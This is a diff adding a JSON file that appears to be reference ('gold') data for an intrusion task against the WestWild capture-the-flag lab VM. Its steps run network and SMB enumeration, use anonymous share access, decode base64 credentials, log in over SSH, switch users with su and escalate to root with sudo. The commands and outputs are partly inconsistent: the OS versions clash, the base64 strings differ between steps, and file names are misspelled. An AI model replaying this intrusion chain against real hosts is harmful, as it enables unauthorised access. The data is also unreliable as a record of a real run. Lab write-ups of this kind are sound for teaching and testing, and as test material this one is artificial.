@@ -1,0 +1,211 @@
+[
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["Target IP address is known (192.168.1.104)", "Network connectivity to target"],
+        "contraindications": [],
+        "goal": "Identify open ports and services on the target system",
+        "command": "nmap -A 192.168.1.104",
+        "output": "Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-16 15:27 GMT\nNmap scan report for 192.168.1.104\nHost is up (0.00059s latency).\nNot shown: 996 closed ports\nPORT    STATE   SERVICE   VERSION\n22/tcp  open    ssh       0enSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu 22.04.1 LTS (GNU/Linux 5.4.0-101-generic x86_64))\n| ssh-hostkey:\n|    1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)\n|    2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)\n|    256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)\n|_   256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)\n80/tcp  open    http      Apache httpd 2.4.7 (Ubuntu)\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n139/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP 445/tcp open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP 445)\nMAC Address: 00:0C:29:D1:B5:42 (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux kernel:3 cpe:/o:linux:linux kernel:4\nOS details: Linux 3.2 - 4.9\nNetwork Distance: 1 hop\nService Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel:4\nHost script results:\n|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: 0s\n|_nbstat: NetBIOS name: WESTWILD, NetBIOS user: <unknown>, NetBIOS\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: westwild\n|   NetBIOS computer name: WESTWILD\\x00\n|   Domain name: \\x00\n|   FQDN: westwild\n|_  System time: 2019-08-16T18:27:25+03:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_ signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_  Message signing enabled but not required\n| smb2-time:\n|   date: 2019-08-16 15:27:25\n|_  start_date: N/A",
+        "results": ["Ports 22 (SSH), 80 (HTTP), 139 (NetBIOS), and 445 (SMB) are open", "Target is running Ubuntu with Samba 4.3.11"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["Target IP address is known (192.168.1.104)", "SMB service is running on target"],
+        "contraindications": [],
+        "goal": "Enumerate SMB shares and users on the target system",
+        "command": "enum4linux 192.168.1.104",
+        "output": "user: [aveng]  rid: [0x3e8]\nuser: [wavex]  rid: [0x3ea]\nuser: [root]  rid: [0x3e9]\n\n---\nShare Enumeration on 192.168.1.104\n---\n\nShareName       Type    Comment\nprint$          Disk    Printer Drivers\nwave            Disk    WaveDoor\nIPC$            IPC     IPC Service (WestWild serv\nReconnecting with SMB1 for workgroup listing.\n\nServer    Comment\n---\nWorkgroup    Master\nWORKGROUP",
+        "results": ["Discovered users: aveng, wavex, root", "Discovered SMB share named 'wave' with comment 'WaveDoor'"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Resource Development",
+        "prerequisites": ["SMB service is accessible on target", "Share 'wave' exists"],
+        "contraindications": [],
+        "goal": "Access the SMB share 'wave' and list its contents",
+        "command": "smbclient //192.168.1.104/wave",
+        "output": "Enter WORKGROUP\\root's password:",
+        "results": ["Password prompt for root"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Resource Development",
+        "prerequisites": ["SMB service is accessible on target", "Share 'wave' exists"],
+        "contraindications": [],
+        "goal": "Access the SMB share 'wave' and list its contents",
+        "command": "",
+        "output": "Anonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                         D      0  Tue  Jul  30 05:18:56 2019\n  ..                        D      0  Thu  Aug   1 23:02:20 2019\n  FLAG1.txt                 D      0  Tue  Jul  30 02:31:05 2019\n  message_from_aveng.txt    N    115  Tue  Jul  30 05:21:48 2019\n\n1781464 blocks of size 1024. 285636 blocks available",
+        "results": ["Anonymous SMB access is allowed", "Found FLAG1.txt and message_from_aveng.txt in the wave share"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Connected to SMB share 'wave'", "FLAG1.txt exists in the share"],
+        "contraindications": [],
+        "goal": "Download FLAG1.txt from the SMB share",
+        "command": "smbclient //192.168.1.104/wave -c 'get FLAG1.txt'",
+        "output": "Enter WORKGROUP\\root's password:",
+        "results": ["Password prompt for root"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Connected to SMB share 'wave'", "FLAG1.txt exists in the share"],
+        "contraindications": [],
+        "goal": "Download FLAG1.txt from the SMB share",
+        "command": "",
+        "output": "Anonymous login successful\ngetting file \\FLAG1.txt of size 93 as FLAG1.txt (45.4 KiloBytes/sec) (average)",
+        "results": ["FLAG1.txt downloaded successfully"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Connected to SMB share 'wave'", "message_from_aveng.txt exists in the share"],
+        "contraindications": [],
+        "goal": "Download message_from_aveng.txt from the SMB share",
+        "command": "smbclient //192.168.1.104/wave -c 'get message_from_aveng.txt'",
+        "output": "Enter WORKGROUP\\root's password:",
+        "results": ["Password prompt for root"],
+        "optional": true,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Connected to SMB share 'wave'", "message_from_aveng.txt exists in the share"],
+        "contraindications": [],
+        "goal": "Download message_from_aveng.txt from the SMB share",
+        "command": "",
+        "output": "Anonymous login successful\ngetting file \\message_from_aveng.txt of size 115 as message_from_aveng.txt (50)",
+        "results": ["message_from_aveng.txt downloaded successfully"],
+        "optional": true,
+        "gold": true
+    },
+    {
+        "tactic": "Credential Access",
+        "prerequisites": ["FLAG1.txt has been downloaded"],
+        "contraindications": [],
+        "goal": "Inspect FLAG1.txt content",
+        "command": "cat FLAG1.txt",
+        "output": "RmxhZzF7V2VsY29tZV9UMF9USEtVzNTVc1XMUXELUIwcmRlcn0KdXNlCjp3YXZleApwYXNz29yZDpkb29yK29wZW4K",
+        "results": ["File contains base64 encoded data"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Credential Access",
+        "prerequisites": ["FLAG1.txt content has been identified as base64 encoded"],
+        "contraindications": [],
+        "goal": "Decode base64 encoded credentials from FLAG1.txt",
+        "command": "echo 'RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K' | base64 -d",
+        "output": "Flag1{Welcome_TO_THE-W3ST-W1LD-B0rder}\nuser:wavex\npassword:door+open",
+        "results": ["Obtained credentials - username: wavex, password: door+open"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["SSH service is running on target", "Valid credentials available (wavex:door+open)"],
+        "contraindications": [],
+        "goal": "Establish SSH session as user wavex",
+        "command": "ssh wavex@192.168.1.104",
+        "output": "wavex@192.168.1.104's password:",
+        "results": ["SSH password prompt for user wavex"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["SSH service is running on target", "Valid credentials available (wavex:door+open)"],
+        "contraindications": [],
+        "goal": "Establish SSH session as user wavex",
+        "command": "door+open",
+        "output": "Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)\n\n* Documentation: https://help.ubuntu.com/\n\nSystem information as of Fri Aug 16 18:33:40 +03 2019\n\nSystem load: 0.0                        Processes: 159\nUsage of /: 77.9% of 1.70GB             Users logged in: 0\nMemory usage: 11% (0.0 GB available)    IP address for eth0: 192.168.1.104\nSwap usage: 0%\n\nGraph this data and manage this system at:\nhttps://landscape.canonical.com/\n\nNew release '16.04.6 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\nYour Hardware Enablement Stack (HWE) is supported until April 2019.\nLast login: Fri Aug 16 18:33:40 2019 from 192.168.1.106\nwavex@WestWild:~$ id\nuid=1001(wavex) gid=1001(wavex) groups=1001(wavex)",
+        "results": ["Successfully authenticated as wavex", "Obtained shell access as wavex (uid=1001)"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Shell access as wavex", "User has permission to search filesystem"],
+        "contraindications": [],
+        "goal": "Find writable directories accessible to current user",
+        "command": "find / -writable -type d 2>/dev/null",
+        "output": "/sys/fs/cgroup/systemd/user/1001.user/2.session\n/usr/share/av/westsidesecret\n/home/wavex\n/home/wavex/.cache\n/home/wavex/wave\n/var/lib/php5\n/var/spool/samba\n/var/crash\n/var/tmp\n/proc/2439/task/2439/fd\n/proc/2439/fd\n/proc/2439/map_files\n/run/user/1001\n/run/shm\n/run/lock\n/tmp",
+        "results": ["Discovered writable directory /usr/share/av/westsidesecret"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Credential Access",
+        "prerequisites": ["Shell access as wavex", "Directory /usr/share/av/westsidesecret is accessible"],
+        "contraindications": [],
+        "goal": "Read the ififorget.sh script to extract credentials",
+        "command": "cat /usr/share/av/westsidesecret/ififoregt.sh; cd",
+        "output": "#!/bin/bash\nfgllet \"if iforegt so this my way\"\necho \"user:aveng\"\necho \"password:kaizen+80\"",
+        "results": ["Obtained credentials - username: aveng, password: kaizen+80"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Lateral Movement",
+        "prerequisites": ["Shell access as wavex", "Valid credentials for aveng user (aveng:kaizen+80)"],
+        "contraindications": [],
+        "goal": "Switch to user aveng",
+        "command": "su aveng",
+        "output": "Password:",
+        "results": ["Password prompt for user aveng"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Lateral Movement",
+        "prerequisites": ["Shell access as wavex", "Valid credentials for aveng user (aveng:kaizen+80)"],
+        "contraindications": [],
+        "goal": "Switch to user aveng",
+        "command": "kaizen+80",
+        "output": "aveng@WestWild:/usr/share/av/westsidesecrts$ cd aveng@WestWild:~$",
+        "results": ["Successfully switched to user aveng"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Shell access as aveng", "User aveng has sudo configured"],
+        "contraindications": [],
+        "goal": "Check sudo permissions for user aveng",
+        "command": "sudo -l",
+        "output": "[sudo] password for aveng:\nMatching Defaults entries for aveng on WestWild:\n    env_reset, mail_backpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n\nUser aveng may run the following commands on WestWild:\n    (ALL : ALL) ALL",
+        "results": ["User aveng can run all commands as root via sudo"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Shell access as aveng", "User aveng has sudo rights for all commands"],
+        "contraindications": [],
+        "goal": "Escalate privileges to root user",
+        "command": "sudo su",
+        "output": "root@WestWild:/home/aveng# cd /root\nroot@WestWild:~#",
+        "results": ["Successfully escalated to root user"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Root shell access", "FLAG2.txt exists in /root directory"],
+        "contraindications": [],
+        "goal": "Retrieve the root flag",
+        "command": "cat /root/FLAG2.txt",
+        "output": "<FLAG>",
+        "results": ["Root flag collected"],
+        "optional": false,
+        "gold": true
+    }
+]
